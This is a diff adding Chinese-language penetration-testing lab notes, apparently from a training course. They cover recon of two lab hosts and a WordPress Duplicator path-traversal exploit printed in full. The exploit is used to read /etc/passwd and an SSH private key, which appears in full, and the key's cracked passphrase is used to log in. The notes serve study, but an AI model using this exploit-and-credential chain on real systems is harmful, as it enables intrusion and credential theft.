@@ -580,6 +580,7 @@ pipeline {
   }
 }
 ```
+>[!Caution]
 緩緩
 LAB restart 後，administrator 就不進去了
 
@@ -597,3 +598,377 @@ Enumerating 公開網路上的機器
 ![image](https://hackmd.io/_uploads/rycUywEn1l.png)
 - MAILSRV1
 - WEBSRV1
+
+### MAILSRV1
+#### 1. 建立工作環境
+```
+┌──(chw㉿CHW)-[~]
+└─$ mkdir beyond
+cd beyond
+mkdir mailsrv1
+mkdir websrv1
+touch creds.txt
+```
+> `creds.txt`:找到的使用者帳號與密碼
+
+### 2. Nmap 掃描 MAILSRV1
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.117.242 
+
+[sudo] password for chw: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-17 06:06 EDT
+Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 91.67% done; ETC: 06:07 (0:00:00 remaining)
+Nmap scan report for 192.168.117.242
+Host is up (0.099s latency).
+Not shown: 991 closed tcp ports (reset)
+PORT     STATE SERVICE       VERSION
+25/tcp   open  smtp          hMailServer smtpd
+| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-title: IIS Windows Server
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+110/tcp  open  pop3          hMailServer pop3d
+|_pop3-capabilities: USER TOP UIDL
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+143/tcp  open  imap          hMailServer imapd
+|_imap-capabilities: CHILDREN OK CAPABILITY completed RIGHTS=texkA0001 ACL QUOTA IMAP4 IMAP4rev1 NAMESPACE IDLE SORT
+445/tcp  open  microsoft-ds?
+587/tcp  open  smtp          hMailServer smtpd
+| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: Host: MAILSRV1; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2025-03-17T10:06:54
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+
+```
+> `-oN`：將結果儲存到 `mailsrv1/nmap` 檔案中
+> > 機器是 Windows 系統\
+ IIS 10.0 Web Server\
+ hMailServer 郵件伺服器\
+多個與電子郵件相關的 port (SMTP, POP3, IMAP)\
+有 NetBIOS 與 SMB 服務（可能允許內部橫向移動）
+
+### 3. 研究 [hMailServer](https://www.hmailserver.com/) 的潛在漏洞
+- 查詢 hMailServer 官方網站 了解功能與版本歷史
+- Google 搜尋 CVE
+- 使用 Exploit-DB 或 Metasploit 來尋找可用的攻擊手法
+
+![image](https://hackmd.io/_uploads/BkD8BOB3yl.png)
+> 除了一些較舊的 CVE 外，沒有其他線索
+#### 4. 掃描 IIS 伺服器
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ gobuster dir -u http://192.168.117.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config
+```
+或
+```
+┌──(chw㉿CHW)-[~]
+└─$ dirsearch -u http://192.168.117.242 -e * -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
+```
+> 沒有明顯有效的檔案或目錄
+
+
+### WEBSRV1
+#### 1. Nmap 掃描 WEBSRV1
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ sudo nmap -sC -sV -oN websrv1/nmap 192.168.117.244
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-17 06:20 EDT
+Nmap scan report for 192.168.117.244
+Host is up (0.12s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 4f:c8:5e:cd:62:a0:78:b4:6e:d8:dd:0e:0b:8b:3a:4c (ECDSA)
+|_  256 8d:6d:ff:a4:98:57:82:95:32:82:64:53:b2:d7:be:44 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+| http-title: BEYOND Finances &#8211; We provide financial freedom
+|_Requested resource was http://192.168.117.244/main/
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-generator: WordPress 6.0.2
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.54 seconds
+```
+> `22/tcp`：SSH ，使用 OpenSSH 8.9p1\
+`80/tcp`：HTTP 服務，運行 Apache 2.4.52
+
+#### 2. 分析 Ubuntu 22.04 的 SSH 服務
+搜尋 OpenSSH 8.9p1 Ubuntu 3 來了解這個版本的 Ubuntu 是否有已知漏洞\
+![image](https://hackmd.io/_uploads/By_vduHn1x.png)
+> 確認這台機器運行的是 Ubuntu 22.04 (Jammy Jellyfish)
+
+#### 3. 掃描 Apache 2.4.52 網站
+- 直接訪問網站，看看是否有敏感信息洩漏。
+- 檢查 HTML 原始碼，尋找 CMS、框架或其他技術資訊。
+- 使用工具偵測網站技術堆疊（如 whatweb）。
+- 使用 WordPress 專門的掃描工具（WPScan）來檢查漏洞。
+
+確認 WordPress 版本:
+```
+──(chw㉿CHW)-[~/beyond]
+└─$ whatweb http://192.168.117.244
+http://192.168.117.244 [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.117.244], RedirectLocation[http://192.168.117.244/main/], UncommonHeaders[x-redirect-by]
+http://192.168.117.244/main/ [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.117.244], JQuery[3.6.0], MetaGenerator[WordPress 6.0.2], Script, Title[BEYOND Finances &#8211; We provide financial freedom], UncommonHeaders[link], WordPress[6.0.2] 
+```
+> WordPress[6.0.2] 、 網站使用 jQuery 3.6.0
+
+使用 WPScan 掃描 WordPress:
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ wpscan --url http://192.168.117.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan
+
+┌──(chw㉿CHW)-[~/beyond]
+└─$ cat websrv1/wpscan 
+...
+[+] duplicator
+ | Location: http://192.168.117.244/wp-content/plugins/duplicator/
+ | Last Updated: 2025-03-11T14:31:00.000Z
+ | Readme: http://192.168.117.244/wp-content/plugins/duplicator/readme.txt
+ | [!] The version is out of date, the latest version is 1.5.12
+...
+```
+> `--enumerate p`: enumerate 已安裝的 plugins\
+`--plugins-detection aggressive`: 使用 Aggressive 模式來檢測 plugins\
+`-o websrv1/wpscan`: 結果 輸出到 websrv1/wpscan 
+>> duplicator 版本 1.3.26，已過時！
+
+#### 4. 搜尋 Duplicator plugin 的漏洞
+使用 searchsploit 來搜尋 Duplicator 1.3.26 的已知漏洞
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ searchsploit duplicator
+----------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                               |  Path
+----------------------------------------------------------------------------- ---------------------------------
+WordPress Plugin Duplicator - Cross-Site Scripting                           | php/webapps/38676.txt
+WordPress Plugin Duplicator 0.5.14 - SQL Injection / Cross-Site Request Forg | php/webapps/36735.txt
+WordPress Plugin Duplicator 0.5.8 - Privilege Escalation                     | php/webapps/36112.txt
+WordPress Plugin Duplicator 1.2.32 - Cross-Site Scripting                    | php/webapps/44288.txt
+Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read     | php/webapps/50420.py
+Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read (Me | php/webapps/49288.rb
+WordPress Plugin Duplicator 1.4.6 - Unauthenticated Backup Download          | php/webapps/50992.txt
+WordPress Plugin Duplicator 1.4.7 - Information Disclosure                   | php/webapps/50993.txt
+WordPress Plugin Duplicator < 1.5.7.1 - Unauthenticated Sensitive Data Expos | php/webapps/51874.py
+WordPress Plugin Multisite Post Duplicator 0.9.5.1 - Cross-Site Request Forg | php/webapps/40908.html
+----------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+>`WordPress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read | php/webapps/50420.py`\
+`WordPress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read (Metasploit) | php/webapps/49288.rb`
+
+## Attacking a Public Machine
+利用前面收集到的資訊來入侵 WEBSRV1
+### Initial Foothold
+#### 1. 查詢下載 exploit
+查看 exploit
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ searchsploit -x 50420
+# Exploit Title: Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read
+# Date: October 16, 2021
+# Exploit Author: nam3lum
+# Vendor Homepage: https://wordpress.org/plugins/duplicator/
+# Software Link: https://downloads.wordpress.org/plugin/duplicator.1.3.26.zip]
+# Version: 1.3.26
+# Tested on: Ubuntu 16.04
+# CVE : CVE-2020-11738
+
+import requests as re
+import sys
+
+if len(sys.argv) != 3:
+        print("Exploit made by nam3lum.")
+        print("Usage: CVE-2020-11738.py http://192.168.168.167 /etc/passwd")
+        exit()
+
+arg = sys.argv[1]
+file = sys.argv[2]
+
+URL = arg + "/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../../../.." + file
+
+output = re.get(url = URL)
+print(output.text)
+```
+> Path Traversal
+
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ searchsploit -m 50420 
+```
+#### 2. 透過 exploit 利用漏洞
+##### 2.1 讀取 `/etc/passwd`
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ python3 50420.py http://192.168.117.244 /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+...
+daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+offsec:x:1000:1000:offsec:/home/offsec:/bin/bash
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
+ftp:x:114:120:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+daniela:x:1001:1001:,,,:/home/daniela:/bin/bash
+marcus:x:1002:1002:,,,:/home/marcus:/bin/bash
+```
+> User: `daniela` 和 `marcus`
+
+##### 2.2 嘗試讀取 SSH 私鑰 (id_rsa)
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ python3 50420.py http://192.168.117.244 /home/marcus/.ssh/id_rsa
+Invalid installer file name!!
+                                                                                                               
+┌──(chw㉿CHW)-[~/beyond]
+└─$ python3 50420.py http://192.168.117.244 /home/daniela/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+QduOTpMIvVMIJcfeYF1GJ4ggUG4=
+-----END OPENSSH PRIVATE KEY-----
+```
+> 成功讀取 daniela 的 SSH 私鑰
+
+#### 3. 使用 SSH 私鑰嘗試登入
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ echo "PRIVATE_KEY_CONTENT" > id_rsa
+┌──(chw㉿CHW)-[~/beyond]
+└─$  chmod 600 id_rsa          
+┌──(chw㉿CHW)-[~/beyond]
+└─$ ssh -i id_rsa daniela@192.168.117.244
+
+The authenticity of host '192.168.117.244 (192.168.117.244)' can't be established.
+ED25519 key fingerprint is SHA256:vhxi+CCQgvUHPEgu5nTN85QQZihXqJCE34zq/OU48VM.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.117.244' (ED25519) to the list of known hosts.
+Enter passphrase for key 'id_rsa':
+```
+> SSH 私鑰受到密碼保護，需要破解密碼
+
+#### 4. 破解 SSH 私鑰密碼
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ ssh2john id_rsa > ssh.hash
+                       
+┌──(chw㉿CHW)-[~/beyond]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:35 0.01% (ETA: 2025-03-22 23:14) 0g/s 35.26p/s 35.26c/s 35.26C/s dragons..poohbear1
+tequieromucho    (id_rsa)     
+1g 0:00:00:39 DONE (2025-03-17 07:05) 0.02502g/s 35.23p/s 35.23c/s 35.23C/s jesse..tagged
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                   
+```
+SSH 登入：
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ ssh -i id_rsa daniela@192.168.117.244                  
+Enter passphrase for key 'id_rsa': tequieromucho
+...
+Last login: Wed Nov  2 09:57:32 2022 from 192.168.118.5
+daniela@websrv1:~$ whoami
+daniela
+```
+> 成功滲透第一台機器
+
+>[!Note]
+>記錄取得的帳號資訊\
+> `echo "daniela: tequieromucho" >> creds.txt`
+### A Link to the Past
+目前已取得 `WEBSRV1` 的 `daniela` 使用者權限\
+接著使用 linPEAS 收集資訊
+#### 1. 使用 linPEAS 進行本機資訊收集
+```
+┌──(chw㉿CHW)-[~/beyond/websrv1]
+└─$ cp /usr/share/peass/linpeas/linpeas.sh .
+                                                                                                               
+┌──(chw㉿CHW)-[~/beyond/websrv1]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+>[!Caution]
+>```
+>┌──(chw㉿CHW)-[~/beyond/websrv1]
+>└─$ curl http://192.168.111.244/main/ -v
+>*   Trying 192.168.111.244:80...
+>* Connected to 192.168.111.244 (192.168.111.244) port 80
+> GET /main/ HTTP/1.1
+> Host: 192.168.111.244
+> User-Agent: curl/8.8.0
+> Accept: */*
+> 
+>* Request completely sent off
+>```
+> LAB 又掛了
